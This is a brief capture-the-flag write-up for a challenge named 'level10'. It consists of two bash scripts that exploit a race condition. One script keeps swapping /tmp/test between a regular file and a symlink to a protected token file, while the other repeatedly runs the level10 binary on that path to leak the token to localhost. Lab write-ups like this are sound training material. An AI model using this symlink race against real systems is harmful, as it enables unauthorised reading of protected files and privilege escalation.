# level10

- We log as 'level10'

- createLink.sh:

#!/bin/bash

while true; do
    
    touch /tmp/test
    
    chmod 777 /tmp/test
    
    rm /tmp/test
    
    ln -s /home/user/level10/token /tmp/test
    
    rm /tmp/test

done

runBinary.sh:
#!/bin/bash
while true; do
    ./home/user/level10/level10 /tmp/test 127.0.0.1
done
